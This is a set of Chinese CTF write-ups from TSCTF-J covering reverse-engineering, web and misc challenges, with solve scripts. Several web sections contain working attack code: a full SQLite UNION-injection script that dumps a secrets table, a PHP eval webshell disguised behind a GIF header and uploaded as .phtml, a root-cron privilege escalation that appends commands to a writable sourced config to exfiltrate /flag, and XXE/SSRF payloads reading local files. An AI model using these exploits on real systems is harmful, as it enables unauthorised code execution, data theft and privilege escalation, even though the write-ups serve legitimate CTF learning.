| `onelinereverse.exe_extracted/algo.pyc` | 1,996 | `81954EBD96F34EDEE85FDE9236A3073117C626CB0FE61A6A51348D9173BF0708` |

<div class="pagebreak"></div>

# ShiftingChecker Writeup

把核心部分丢给chat,得知这是一个xor之后选择先spam 46个1进去然后再用Scylla dump,然后丢给chat解决.

- 分类：reverse
- flag：`TSCTF-J{y0u_h4v3_def34ted_th3_m4gic_xxT3A_smc}`

## 思路

1. **自解密（SMC）**：64 位 MinGW-w64 PE，入口 RVA `0x13F0`。`.text` 里 RVA `0x16A0` 起的 **508 字节**不是正常代码（静态反汇编会把它们当成数据/垃圾指令），它由 RVA `0x1450` 的解密器在运行时还原：
   - `C6 45 FF A7`（RVA `0x1470`）把密钥初值 `0xA7` 写进栈上字节变量；`B9 FC 01 00 00`（RVA `0x147C`）给出长度 `0x1FC = 508`；
   - 循环体（RVA `0x14B7` 起）做 `c ^= key; key = (key * 0x3D + 0x17) & 0xFF`（对应 `imul eax, 0x3D` + `add eax, 0x17`）；
   - 作用范围 = RVA `0x16A0`–`0x189C`，即文件偏移 `0xAA0` 起 `0x1FC` 字节。
2. **先改页属性再解密**：XOR 前调 `VirtualProtect(区域, 0x1FC, 0x40 = PAGE_EXECUTE_READWRITE, &old)`（走 IAT RVA `0x8310`），循环后调 `FlushInstructionCache(GetCurrentProcess(), 区域, 0x1FC)`（IAT RVA `0x82D0` / `0x82D8`）——典型 SMC 手法。按该 key 流解密后首字节是 `55 48 89 e5 48 83 e4 f0 48 83 ec 30`（标准序言），且与运行期内存里同一段**逐字节一致（508/508）**。
3. **解密出来的是 XXTEA 加密函数**（起点 RVA `0x16A0`）：
   - RVA `0x16B6` / `0x16BE` / `0x16C6` / `0x16CE` 四条 `mov dword [rsp+X], imm32` 依次压入 key = `{0x13572468, 0x89ABCDEF, 0x0BADF00D, 0xC001D00D}`；
   - RVA `0x16D2` 写入轮数 `12`；
   - RVA `0x1714` 是 `add dword [rsp+0x28], 0x7F4A7C15`（立即数落在 RVA `0x1718`），即每轮 `sum += delta`，**delta = `0x7F4A7C15`**，不是标准 XXTEA 的 `0x9E3779B9`——这是本题的"魔改"点。签名相当于 `xxtea_encrypt(uint32_t *v, int n)`。
4. **密文是明文躺在数据段里的**：`.rdata` RVA `0x4020` 起 48 字节（文件偏移 9760）；紧随其后的是 RVA `0x4050` 的 `"Wrong"`、RVA `0x4056` 的 `"\r\n"`、RVA `0x4059` 的 `"Correct"`。
5. **校验流程**：`main`（RVA `0x15F8`）先 `fgets(buf, 0x40, stdin)`（IAT RVA `0x8450`），再 `strcspn(buf, "\r\n")` 去换行，然后调 `check`（RVA `0x155D`）：
   - `strlen` 必须恰好等于 **46**（`48 83 F8 2E`）；
   - 把 46 字节 `memcpy` 进一个已被 `rep stosq` 清零的 **48 字节**局部缓冲（尾部自动补 2 个 `0x00`）；
   - 调 SMC 解密器 RVA `0x1450`，再调 XXTEA RVA `0x16A0`（`edx = 12`，即 12 个 32 位字 = 48 字节）；
   - `memcmp(结果, RVA 0x4020, 0x30)`（IAT RVA `0x8380`），相等则 `puts("Correct")`，否则 `puts("Wrong")`。
6. **结论**：flag 就是"用上面的 key / delta / 轮数加密后正好等于 RVA `0x4020` 那 48 字节"的输入，因此**对密文做 XXTEA 逆运算**即可，前 46 字节是 flag，末尾 2 个 `0x00` 是校验时补的填充。

## EXP

```python
import struct

# 密文 qword（第三个已修正）
cipher_qwords = [
    0x5C4EBBDCB2325CBD,
    0x6C870D336C0B5A13,
    0xF0C02423E9688EE6,
    0x2B27788DC8EF2A97,
    0x182A3E460F88A5C6,
    0x84050096BA6F352F
]

# 拆成 12 个小端 32 位整数
v = []
for q in cipher_qwords:
    v.append(q & 0xFFFFFFFF)          # 低 32 位
    v.append((q >> 32) & 0xFFFFFFFF)  # 高 32 位

# 密钥
key = [0x13572468, 0x89ABCDEF, 0x0BADF00D, 0xC001D00D]
delta = 0x7F4A7C15
rounds = 12
n = len(v)  # 12

def mx(y, z, sum, e, i):
    """严格按照加密代码中的公式"""
    kidx = (i + e) & 3
    part1 = ((z ^ sum) + (y ^ key[kidx])) & 0xFFFFFFFF
    part2 = (((4 * z) & 0xFFFFFFFF) ^ (y >> 5)) & 0xFFFFFFFF
    part3 = ((z >> 3) ^ ((16 * y) & 0xFFFFFFFF)) & 0xFFFFFFFF
    return (part1 ^ ((part2 + part3) & 0xFFFFFFFF)) & 0xFFFFFFFF

# 解密
sum = (delta * rounds) & 0xFFFFFFFF
for _ in range(rounds):
    e = (sum >> 2) & 3

    # 逆向 v[n-1]
    z = v[0]
    y = v[n-2]
    m = mx(y, z, sum, e, n-1)
    v[n-1] = (v[n-1] - m) & 0xFFFFFFFF

    # 逆向内层循环 i = n-2 .. 0
    for i in range(n-2, -1, -1):
        z = v[i+1]
        y = v[n-1] if i == 0 else v[i-1]
        m = mx(y, z, sum, e, i)
        v[i] = (v[i] - m) & 0xFFFFFFFF

    sum = (sum - delta) & 0xFFFFFFFF

# 转成字节
plain = b''
for d in v:
    plain += struct.pack('<I', d)

print("明文 hex:", plain.hex())
print("明文 bytes:", plain)
try:
    print("明文 UTF-8:", plain.decode('utf-8'))
except:
    print("UTF-8 解码失败，可能包含不可打印字符")

# 输入要求 46 字节，后面补 2 个 0
flag = plain[:46]
print("Flag:", flag.decode('utf-8', errors='ignore'))
```

SMC 段的原地还原（把 RVA `0x16A0` 那段 508 字节 XOR 回来，就能当正常代码静态分析）：

```python
key, n = 0xA7, 0x1FC          # 初值 RVA 0x1470，长度 RVA 0x147C
data = exe[0xAA0:0xAA0 + n]   # RVA 0x16A0 → 文件偏移 0xAA0
for i in range(n):
    data[i] ^= key
    key = (key * 0x3D + 0x17) & 0xFF
```

<div class="pagebreak"></div>

# Unpack_the_Truth Writeup

用ESP定律脱了魔改UPX,然后手动修复一些花指令,核心代码丢给chat解了.

- 分类：reverse
- flag：`TSCTF-J{cr4ck_th3_sh3ll_4nd_f1nd_th3_pear1}`

## 思路

1. 附件是 9216 字节的 PE32+（ImageBase `0x40000000`）。正常 UPX 壳会在节表里留下 `UPX0` / `UPX1` / `UPX!` 等名字，而这个文件里搜不到上述任何字样：3 个 section 的 8 字节 Name 字段被整体清零（原始字节全为 `00`，即 `00*8`），所以从节表上完全看不出壳的痕迹。
2. 正因为签名与段名都被抹掉，标准 `upx -d` 认不出这是 UPX（它靠 `UPX!` 标记与 `UPX0` / `UPX1` 段名定位），因此无法直接脱壳，这是本题的第一层障碍。
3. 该文件入口点为 RVA `0xC9E0`，落在最后一个 section 内：该段 VA `0xD000`、VS `0x1000`、RawSize `0x400`、标志 `0xC0000040`（可读可写），文件里对应区间全是乱码字节。也就是说这里放的是壳自己的解密 stub，真正的原始程序在磁盘上没有明文形态。
4. 脱壳走的是“运行到 OEP 后 dump 进程内存”的路子。dump 出来的镜像为 40448 字节，沿用 ImageBase `0x89440000`、入口 RVA `0x13F0`，但三段 RawSize 已按真实体积写回：`0x7A00` / `0x1E00` / `0x400`；而壳文件对应值是 `0` / `0x1E00` / `0x400`。第一段整体原本在磁盘上不存在（RawSize 为 0），正是被壳压缩掉的代码段——dump 之后它才以明文出现在镜像里。
5. 该 dump 的 Import Directory 为 RVA `0x0`、Size `0x10`，等于没有导入表：程序既不能直接运行，也无法正确定位 API，必须做导入表重建（Scylla 一类工具，其输出段名即 `.SCY`）。
6. 重建结果变成 4 段（43008 字节，比原始 dump 多 2560 字节），多出来的就是 `.SCY`：VA `0xE000`、VS/RawSize `0x1000` / `0x800`、标志 `0xE0000060`（可读可写可执行）。`.SCY` 段内是重建出的 `kernel32.dll` / `ucrtbase.dll` 导入描述与函数名表，函数名包括 `DeleteCriticalSection`、`VirtualProtect`、`memcmp`、`strncmp`、`puts` 等。
7. 花指令：dump 出来的 `.text` 里散落着大量孤立片段——同一文件里出现多份只有头尾的 `ATUWVSH … [^_]A\`、`WVSH … [^_]`、`UAWAVAUATWVSH … [^_A\A]A^A_]` 残片；还有 `E8 …` 之后紧跟 `48 31 C0 48 85 C0 74 01 E8` 这类序列（`call` 之后先 `xor rax, rax` 把自己清零、再 `test rax, rax` 作条件跳转），两头都是空转，永远不会真正改变执行流。分析时要把这些片段整体剔除，否则反编译结果会被带偏（按原始字节 `E8 …` 直接反汇编会得到无意义的交叉引用与孤立基本块）。
8. 算法是魔改 RC4。与标准 RC4 的差异共三处，全部体现在解密脚本里：
   - **S 盒只有 128 字节**（`S = list(range(128))`），KSA 全程 `% 128`；
   - PRGA 里 `j` 的更新是 `j = (j + S[i] + 1) % 128`，比标准 RC4 多一个 `+1`；
   - 输出流以**加法**作用到明文上（标准 RC4 是异或），所以解密端是减法 `(c - k) & 0xFF`。
9. key 是 `Merak2026`，在 dump 出的镜像里以“运行时拼到栈上”的方式构造：文件偏移 `0x8AB` 处是 `48 B8 4D 65 72 61 6B 32 30 32`，即 `movabs rax, "Merak202"`（`movabs` 的 8 字节立即数只装得下 `Merak202`）；紧接着 `66 C7 85 9E 00 00 00 36 00` 把 `0x36`（字符 `6`）写进栈缓冲区 `[rbp-0x62]` 处补齐。因此静态搜索 `Merak2026` 是搜不到的，必须看这两条指令的拼接结果。
10. 密文是 43 字节，位于同镜像文件偏移 `0x2400`（RVA `0x3000`，落在 `.data` 里），内容与下方 EXP 脚本中硬编码的 `cipher` 数组逐字节一致：`5E 76 4F BB 56 50 C5 EF A9 74 8F DC D3 AC 82 E5 AE 67 EB 93 70 85 D7 6A A5 A5 7E 8D E4 43 D8 D3 AC 7B E6 68 72 93 6F 83 BB 84 F1`。该序列在壳文件里搜不到，只在解壳后的镜像中出现，说明它就是被壳保护起来的校验数据。
11. 还原：用第 8 步的魔改 RC4（S 盒 128 / KSA `%128` / PRGA `j+1` / 解密用减法）与第 9 步的 key `Merak2026` 解第 10 步的 43 字节密文，即得 `TSCTF-J{cr4ck_th3_sh3ll_4nd_f1nd_th3_pear1}`。

## EXP

```python
def rc4_mod128_decrypt(cipher: bytes, key: bytes) -> bytes:
    # KSA
    S = list(range(128))
    key_len = len(key)
    j = 0
    for i in range(128):
        j = (j + S[i] + key[i % key_len]) % 128
        S[i], S[j] = S[j], S[i]

    # PRGA + 解密
    i = 0
    j = 0
    plain = []
    for c in cipher:
        i = (i + 1) % 128
        j = (j + S[i] + 1) % 128          # 注意这里 +1
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) & 0x7F]
        p = (c - k) & 0xFF                # 加密是加法，所以解密是减法
        plain.append(p)
    return bytes(plain)

cipher = bytes([
    0x5E, 0x76, 0x4F, 0xBB, 0x56, 0x50, 0xC5, 0xEF,
    0xA9, 0x74, 0x8F, 0xDC, 0xD3, 0xAC, 0x82, 0xE5,
    0xAE, 0x67, 0xEB, 0x93, 0x70, 0x85, 0xD7, 0x6A,
    0xA5, 0xA5, 0x7E, 0x8D, 0xE4, 0x43, 0xD8, 0xD3,
    0xAC, 0x7B, 0xE6, 0x68, 0x72, 0x93, 0x6F, 0x83,
    0xBB, 0x84, 0xF1
])

key = b"Merak2026"
plain = rc4_mod128_decrypt(cipher, key)
print(plain.decode(errors="replace"))
```

输出即 flag：`TSCTF-J{cr4ck_th3_sh3ll_4nd_f1nd_th3_pear1}`。

<div class="pagebreak"></div>

# 好想玩原神 Writeup

用chat问出了username = UNION SELECT 1,2,3,4 ', password = '的注入,然后替换一个为database(),报错了,百思不得其解以为是引号问题,卡在这里了

完全忘记看index.html了!!!根本没看到那几组密码!!后来用sqlmap一把梭无果,丢给agent.

然后agent注明白了,原来是sqlite啊哈哈,根本没见过.

- 分类：web
- flag：`TSCTF-J{Y@u_c4N_9l4|_G3n5he^!}`

## 思路

1. `index.html` 里的 HTML 注释泄露了 10 组账号，例如 `13874261905 / Windfall2407`；`/robots.txt` 提示 legacy login gateway still renders selected account rows，注入点即 `POST /api/login`（JSON 参数 `username`、`password`）。
2. 套出服务端 SQL（裸 f-string 拼接、零转义、零参数化，结果列 4 个）：
   `SELECT phone,traveler,adventure_rank,server FROM users WHERE username = '{username}' AND password = '{password}'`
3. 登录处是 SQLite 字符串型注入。WAF 拦截注释符/分隔符 `--`、`#`、`/*`、`*/`、`;`，也拦 `sleep`、`benchmark`、`load_file`、`attach`、`or 1=1`，因此“注释掉尾部 `' AND password = '…`”这条常规路不通；但 `union`、`select` 不拦，可以正常使用 UNION 注出数据。
4. 破局点不是绕过 WAF，而是让尾部自己合法：`password` 传单个 `'`，尾部残留的 4 个引号（模板收尾 + 模板前置 + `password` 自身 + 模板最后收尾）被 SQLite 配平成一个字符串字面量 `' AND password = '`，正好落在 `UNION` 第 4 个结果列的**别名位**——`SELECT 4 ' AND password = '` 在 SQLite 里是合法语法。整个语句因此天然成立，完全不需要注释符。
5. 确认列数/列序：`' UNION SELECT 1,2,3,4` + `password='` 回显 `{"phone":1,"traveler":2,"adventure_rank":3,"server":4}`，即列序为 `phone, traveler, adventure_rank, server`；列数改为 5 即 400，说明模板固定 4 列，取数时必须维持 4 列形状。
6. 指纹：`sqlite_version()` → `3.46.1`，故用 `sqlite_master` 而非 `information_schema`。`database()` 是 MySQL 函数，在 SQLite 报 `no such function` 返回 400，属于 SQL 报错而非 WAF 拦截，判读响应时要区分。
7. 泄模板：第 4 列塞字符串字面量 `' UNION SELECT 1,2,3,'a'`，`server` 字段回显 `a' AND password = '`，直接暴露注入点两侧的模板原文，也就反过来印证了第 4 步的“别名位”解释。
8. payload 纪律：不出现任何多余单引号（会破坏配平），字符串常量改用 `char()`（`char(116,97,98,108,101)` = `'table'`）；带 `FROM` 的子查询必须加括号以维持 4 列。
9. 取数路径：`sqlite_master` 列出 `accounts, sqlite_sequence, secret_flags`，直接读 `secret_flags.flag_value` 得到 flag，并用 `hex()` 交叉校验。表结构为 `accounts(id,phone,password,traveler,adventure_rank,server)`、`secret_flags(id,flag_value,note)`。
10. 响应区分（用于判断“被 WAF 拦”还是“SQL 报错”）：成功/有结果 `200 {"items":[…],"ok":true}`；账号密码错 `403 {"redirect":"…","ok":false}`；被 WAF 拦 `403 {"error":"blocked by login firewall","redirect":"…"}`；SQL 出错 `400 {"detail":"OperationalError",…}`。脚本里就靠 `login firewall` 字样与 `detail` 字段分别识别后两种。

## EXP

关键注入 payload，均为 `POST /api/login`、`Content-Type: application/json`：

```jsonc
// 1) 探列/列序
{"username":"' UNION SELECT 1,2,3,4","password":"'"}
// -> {"phone":1,"traveler":2,"adventure_rank":3,"server":4}

// 2) 指纹
{"username":"' UNION SELECT sqlite_version(),NULL,NULL,NULL","password":"'"}   // -> 3.46.1

// 3) 泄 SQL 模板（第 4 列塞字符串字面量）
{"username":"' UNION SELECT 1,2,3,'a'","password":"'"}   // -> server = "a' AND password = '"

// 4) 列表（char(116,97,98,108,101) = 'table'）
{"username":"' UNION SELECT (SELECT group_concat(name) FROM sqlite_master WHERE type=char(116,97,98,108,101)),NULL,NULL,NULL","password":"'"}
// -> accounts,sqlite_sequence,secret_flags

// 5) 表结构
{"username":"' UNION SELECT (SELECT group_concat(sql) FROM sqlite_master WHERE type=char(116,97,98,108,101)),NULL,NULL,NULL","password":"'"}
// -> accounts(id,phone,password,traveler,adventure_rank,server) / secret_flags(id,flag_value,note)

// 6) 取 flag 并 hex 校验
{"username":"' UNION SELECT (SELECT flag_value FROM secret_flags),NULL,NULL,NULL","password":"'"}
{"username":"' UNION SELECT (SELECT hex(flag_value) FROM secret_flags),NULL,NULL,NULL","password":"'"}
// -> 54534354462D4A7B5940755F63344E5F396C347C5F47336E3568655E217D
```

完整注入脚本如下：一条龙完成“探列 → 指纹 → 泄模板 → 列表/表结构 → dump `secret_flags`（`flag_value`、`note`、`hex(flag_value)`）”，六个 payload 的构造全部走 `u1()` / `u4()` 两个拼装函数，`PW = "'"` 是全题钥匙。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
web-好想玩原神  --  SQLite UNION injection at POST /api/login

服务端还原出的 SQL（裸 f-string，无转义、无占位符）：

    SELECT phone, traveler, adventure_rank, server FROM users
    WHERE username = '{username}' AND password = '{password}'

尾部的 `' AND password = '{password}'` 就是为什么 password 必须传一个单引号：
剩下的引号会被配平成一个字符串字面量，SQLite 接受它作为结果列别名，于是不需要
注释符（`--`、`#`、`/*`）——而登录防火墙恰好把这些全拦了。
"""
import json
import re
import sys

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://<TARGET>:<PORT>"

# payload 常量保持无单引号：多一个引号就会破坏上面的配平。
# payload 需要的字符串常量一律用 char() 构造。
PW = "'"                          # password 传单个引号，尾部引号被配平成第 4 列别名位
TBL = "char(116,97,98,108,101)"    # 'table'


def u1(expr):
    """把表达式放进 UNION 第 1 列（phone）回显，其余 3 列用 NULL 占位。"""
    return "' UNION SELECT %s,NULL,NULL,NULL" % expr


def u4(expr):
    """把表达式放进 UNION 第 4 列（server）回显，第 4 列正是别名位。"""
    return "' UNION SELECT 1,2,3,%s" % expr


def login(username, password):
    """单次请求用一条新连接。

    前置代理会在 TLS 中途掐掉 keep-alive 长连接（SSLEOFError），所以绝不复用
    session，失败就重试几次。
    """
    last = None
    for attempt in range(5):
        s = requests.Session()
        s.verify = False
        try:
            r = s.post(BASE + "/api/login",
                       data=json.dumps({"username": username, "password": password}),
                       headers={"Content-Type": "application/json",
                                "Connection": "close"},
                       timeout=20)
            return r.status_code, r.json()
        except Exception as e:          # SSL reset / 代理瞬时故障
            last = e
        finally:
            s.close()
    raise RuntimeError("request failed after retries: %s" % last)


def fetch(payload, col="phone"):
    """发送一条 username payload 并取回显列。

    第 1 列（phone）默认回显，其余列为 NULL 填充。payload 里出现 FROM 时，
    子查询必须自带括号，这样 UNION 才能保持 4 列形状。
    """
    code, body = login(payload, PW)
    if "login firewall" in json.dumps(body):
        raise RuntimeError("blocked by login firewall: %s" % payload)
    if not isinstance(body, dict) or body.get("detail"):
        raise RuntimeError("SQL error for %r: %s" % (payload, body))
    items = body.get("items") or []
    if not items:
        return None
    return items[0].get(col)


def main():
    # 1) 探列/列序：列数不对直接 400
    code, body = login("' UNION SELECT 1,2,3,4", PW)
    print("[*] columns    : %s" % json.dumps(body, ensure_ascii=False))

    # 2) 指纹
    ver = fetch(u1("sqlite_version()"))
    print("[*] dbms       : SQLite %s" % ver)
    if not ver or not re.match(r"^\d+\.\d+", str(ver)):
        sys.exit("[-] target did not behave as expected")

    # 3) 泄 SQL 模板：第 4 列塞字符串字面量，server 回显模板原文
    leak = fetch(u4("'a'"), "server")
    print("[*] template   : %s" % leak)

    # 4) 列表：char(116,97,98,108,101) = 'table'，避免出现单引号
    tables = fetch(u1("(SELECT group_concat(name) FROM sqlite_master "
                      "WHERE type=%s)" % TBL))
    print("[*] tables     : %s" % tables)

    # 5) 表结构
    ddl = fetch(u1("(SELECT group_concat(sql) FROM sqlite_master WHERE type=%s)" % TBL))
    for stmt in (ddl or "").split("),"):
        print("[*] ddl        : %s" % stmt.strip().replace("\n", " "))

    # 6) dump secret_flags，并用 hex() 交叉校验
    flag = fetch(u1("(SELECT flag_value FROM secret_flags)"))
    fhex = fetch(u1("(SELECT hex(flag_value) FROM secret_flags)"))
    note = fetch(u1("(SELECT note FROM secret_flags)"))
    print("[*] note       : %s" % note)
    print("[*] hex        : %s" % fhex)
    if fhex:
        print("[*] hex->ascii : %s" % bytes.fromhex(fhex).decode())
    print("[+] FLAG: %s" % flag)
    return flag


if __name__ == "__main__":
    main()
```

<div class="pagebreak"></div>

# 玛德莱娜小蛋糕 Writeup

用了chat. phtml+短标签+gif头getshell成功之后不知道怎么读flag,在chat的提醒下读了entrypoint.sh(btw,看起来像是LLM写的),找到cron,然后发现了越权.

- 分类：web
- flag：`TSCTF-J{cRO7-1N_53@R6h_OF_l0St_b@K3-a7d-f13g1341884f}`

## 思路

1. 首页是相册上传（`POST /index.php`，字段 `photo`，页面提示"递上一张 GIF 相片"）。上传点对**文件头**做了 GIF 校验，对**后缀**则另有一套黑名单。
2. 文件头这一关用 GIF 魔数就能骗过：内容以 `GIF89a` 开头即可。后缀这一关按常见思路试"Apache 仍当 PHP 解析、但黑名单容易漏掉"的写法（`.phtml`、`.pht`、`.php5` …），`.phtml` 直接通过。于是把 webshell 写成 `GIF89a` 头 + PHP 短标签，文件名 `p.phtml` 上传；响应里回显落地路径 `/storage/tmp/<random>.phtml`，访问即得 webshell（`uid=33(www-data)`）。
   （打进容器后可以确认，黑名单只列了 `php / php3 / php4 / php5 / php7 / php8 / phar`，确实漏掉 `.phtml`。）
3. 提权走 cron。拿下 www-data 之后，容器里 `/entrypoint.sh`（755，可读）直接写着 `cron is the intended solution path`，于是去看 cron —— `/etc/cron.d/teahouse-cleanup` 每分钟以 **root** 执行

   ```
   * * * * * root /bin/bash /opt/teahouse/bin/clean_uploads.sh >> /var/log/teahouse-cleanup.log 2>&1
   ```

4. `clean_uploads.sh` 里有一步

   ```bash
   PROFILE_FILE="/var/lib/teahouse/cleanup.conf"
   ...
   if [ -f "$PROFILE_FILE" ]; then
       source "$PROFILE_FILE"
   fi
   ```

   而 `cleanup.conf` 的权限是 `-rw-rw-r-- www-data www-data` —— **www-data 可写**。往里面追加一行命令，下一分钟就会被 root 的 cron 以 root 身份执行。
5. `/flag` 是 `root:root 0600`，所以追加的一行把 flag 抄到 web 可读目录：

   ```
   cat /flag > /var/www/html/storage/leak.txt; chmod 644 /var/www/html/storage/leak.txt
   ```

   等一分钟取回 `/storage/leak.txt`，即得 flag。

## EXP

```python
#!/usr/bin/env python3
# TSCTF-J 2026 -- web-玛德莱娜小蛋糕
#
# 上传点只查文件头 + 后缀黑名单（php / php3 / php4 / php5 / php7 / php8 / phar），
# 所以 `GIF89a` 头 + `.phtml` 后缀 + PHP 短标签就能落一个 webshell，
# 路径 /storage/tmp/<rand>.phtml，Apache 直接把 .phtml 交给 PHP 解析。
#
# root 的 cron 每分钟执行 /opt/teahouse/bin/clean_uploads.sh，脚本里有
#     source "/var/lib/teahouse/cleanup.conf"
# 而这个 conf 是 www-data:www-data 664 —— 追加一行命令即以 root 执行。

import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = "<TARGET>"
BASE = f"https://{HOST}"
SHELL = b"GIF89a<?= eval($_GET['cmd']); ?>"
CONF = "/var/lib/teahouse/cleanup.conf"
LEAK = "/var/www/html/storage/leak.txt"
LEAK_URL = "/storage/leak.txt"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def req(path, data=None, headers=None):
    r = urllib.request.Request(BASE + path, data=data)
    r.add_header("Host", HOST)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def upload():
    b = "----tsctfboundary"
    body = (f"--{b}\r\nContent-Disposition: form-data; name=\"photo\"; "
            f"filename=\"p.phtml\"\r\nContent-Type: image/gif\r\n\r\n").encode()
    body += SHELL + f"\r\n--{b}--\r\n".encode()
    st, resp = req("/index.php", data=body,
                   headers={"Content-Type": f"multipart/form-data; boundary={b}"})
    m = re.search(rb'href="(/storage/tmp/[^"]+)"', resp)
    if not m:
        raise SystemExit(f"[!] upload failed ({st}): {resp[:300]!r}")
    return m.group(1).decode()


def sh(shell, cmd):
    php = "'" + cmd.replace("\\", "\\\\").replace("'", "\\'") + "'"
    q = urllib.parse.urlencode({"cmd": f"system({php});"})
    _, body = req(f"{shell}?{q}")
    out = body.decode("utf-8", "replace")
    return out[6:] if out.startswith("GIF89a") else out


def main():
    shell = upload()
    print("[*] webshell:", shell)
    print("[*] id      :", sh(shell, "id").strip())

    sh(shell, f"echo 'cat /flag > {LEAK}; chmod 644 {LEAK}' >> {CONF}")
    print("[*] 已追加到 root cron 会 source 的 conf，等 cron 触发 ...")

    for _ in range(20):
        time.sleep(6)
        st, body = req(LEAK_URL)
        m = re.search(rb"[A-Za-z0-9_-]*\{[^}\r\n]{1,80}\}", body)
        if st == 200 and m:
            print(f"\n[+] FLAG: {m.group(0).decode()}")
            return 0
    raise SystemExit("[!] no flag")


if __name__ == "__main__":
    raise SystemExit(main())
```

<div class="pagebreak"></div>

# MinePortrait Writeup

- 分类：web
- flag：`（未解出）`

## 思路

1. `/robots.txt` 指向 `www.zip`，解开只有两个文件：
   - 泄露的登录源码：账号 `m0rnis` / 口令 `passw0rd`；
   - `old_note.txt`：内部 media helper 服务在 `127.0.0.1`，路由 `/fetch.php`，参数 `url`，flag 在 `flag.txt`；注释里写明它"只能从工作网访问"。
2. 用泄露凭据登录后是图片转换功能，允许上传 SVG，于是从 SVG 的外部实体入手试 XXE。
3. 内部实体（`<!ENTITY a "hi">`）能被解析，说明 XML 解析器确实在处理实体；但换成外部实体去读文件或发请求时，返回始终像被拦掉或被过滤过。
4. 判断前面有 WAF，但**始终没搞清它的拦截机制**——是拦关键字、拦响应内容、还是拦内网请求，无法区分：试过关键字大小写混合、两次编码、`PUBLIC` 替换 `SYSTEM`、实体分段拼接、`<!-- -->` 拆分、CDATA 包裹等，全都没有回显。后来换成 agent 大量 fuzz 也没有结论。
5. 原本的思路是用 XXE 打 `127.0.0.1/fetch.php`（SSRF）去读 `flag.txt`，这一步没打通。

## EXP

（尝试过的 payload，均无回显）

```xml
<!-- 1) 实体解析探测：能解析，说明 XXE 面存在 -->
<!DOCTYPE svg [<!ENTITY a "hi">]><svg xmlns="http://www.w3.org/2000/svg">&a;</svg>

<!-- 2) 直接读文件（被拦） -->
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///flag.txt">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>

<!-- 3) 打内部 helper 做 SSRF（被拦） -->
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://127.0.0.1/fetch.php?url=file:///flag.txt">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```

- 绕过尝试：关键字大小写混合、URL / 实体两次编码、`PUBLIC` 替代 `SYSTEM`、把实体名或 URL 拆成多段拼接、外层再包一层 DOCTYPE —— 全部无回显。

<div class="pagebreak"></div>

# STARRY Writeup

- 分类：web
- 附件：无（线上环境）
- flag：`（未解出）`

## 思路

1. 站点前端是 Vite dev server 直接提供的（`/@vite/client` + module 脚本），从 `package.json` 拿到版本 `v8.0.4`。
2. 该版本的开发服务器存在 WebSocket 任意文件读取漏洞，公开 POC 仓库：<https://github.com/Firebasky/CVE-2026-39363>。
3. POC 直接打不通，改了几处之后才拿到任意文件读取（改动见 EXP）。
4. 但光有任意文件读取并没读到 flag，靠它到处翻文件也没有结果。于是去锤出题人，得到的消息是：**这个 CVE 的用法没问题，但还需要别的洞**。
5. 之后就卡住了，直到想起来把 `main.js` 之类的源码丢给 chat 分析——**又忘了看注释**，注释里就写着一个泄露的路径 `/run/starry`。
6. 读该路径下的文件，拿到 `claim` 的流程说明；照着流程调 `claim` 接口，成功拿到 admin 身份。
7. 之后卡在 `/preview`：它需要传入ticket,但是到底怎么传ticket?GET,POST,请求头都试了,还是没反应.然后想到可能是内部状态,但是claim已经过了啊?
8. 从 `/preview` 的行为看是服务端渲染，判断存在 SSTI；知道要用模板注入，但没能构造出可用的 payload。

## EXP

公开 POC（<https://github.com/Firebasky/CVE-2026-39363>）针对本题必须改的地方：

1. **`ws://` → `wss://`**：线上是通过 TLS 暴露的，`poc.js` 里的 `wsUrl` 和 `exp.py` 里打印的 WebSocket 地址都要改。
2. **只保留一种路径试探**：`poc.js` 原本会依次试 5 种写法（`file://` 绝对路径、`file://` 正斜杠路径、裸路径、`/@fs/` 前缀、无盘符前缀），改成只发 `file://<绝对路径>` 这一种，其余注释掉 —— 多发反而会干扰。
3. **缩短等待**：试探间隔 `delay` 500 → 0，收尾等待 10000 → 1000，否则光等就十秒。
4. **加心跳**：每 15 秒发一次 `{"type":"ping"}`，避免等待期间连接被服务端或前置代理断掉。

改动之后即可用 `fetchModule` 读到目标机器上的任意文件（`git diff` 里就是这几处）。

<div class="pagebreak"></div>

# MisC Writeup

抄写了一下密文,尝试理解变换那部分但是发现我可能不懂数电,于是被agent暴力解决了.

- 分类：misc
- flag：`TSCTF-J{!?REd5t0nE-reVerSe?!}`

## 思路

1. 解压后是 Minecraft 存档，世界名 `!?MisC?!`，里面用红石元件搭了一台逐组输入的校验机：投掷器里的红石当信号、红石火把与红石线做与/或、比较器做位比较、红石中继器做时序。机器旁告示牌写着 `check answer!` 与 `If you have input everything, then click this!`，判定结果牌分别是 `CONGRATULATIONS! / This is the right flag! / Submit to SCORE!!!` 和 `wrong :(`、`Oops... It seems the flag you have just input is wrong...`。
2. 机器里有两个寄存器。第一个是译码/锁存表，读出 16 行半字节映射：按 nibble 位序 `r0 r1 r2 r3` 读入后是恒等表（`0→0`、`1→1`、…、`F→F`），即锁存器本身不改变数值。
3. 第二个寄存器存密文，共 **58 组 × 4 bit = 232 bit = 29 字节**，按机器输出顺序抄录为 `A5 00 32 AD 02 C0 6E C4 6E C0 66 91 1B A8 39 38 39 2C 69 1A BD 48 75 30 3B 84 68 40 47`。**结论一：这个寄存器必须整体倒序读**（从最后一组读回第一组）；按机器输出顺序正着读会得到互相矛盾的约束、完全无解。
4. 电路逻辑：`d1~4 = c1~4 ^ b1~4`（锁存器与本次输入的明文 nibble 异或），`d` 再经位交换与异或链组成的组合逻辑 `T` 得到 `e1~4`，最后把 `c1~4 = e1~4` 锁存回去，进入下一组。
5. **结论二：判别用的是 `e1~4 == a1~4`（与密文寄存器比较），不是与明文比较。** 这是最容易抄错的一处：按“与明文比较”去做会得到另一个自洽但错误的电路。改对之后，校验通过等价于 `c_k = a_k`，即 `T(a_{k-1} ^ b_k) = a_k`。
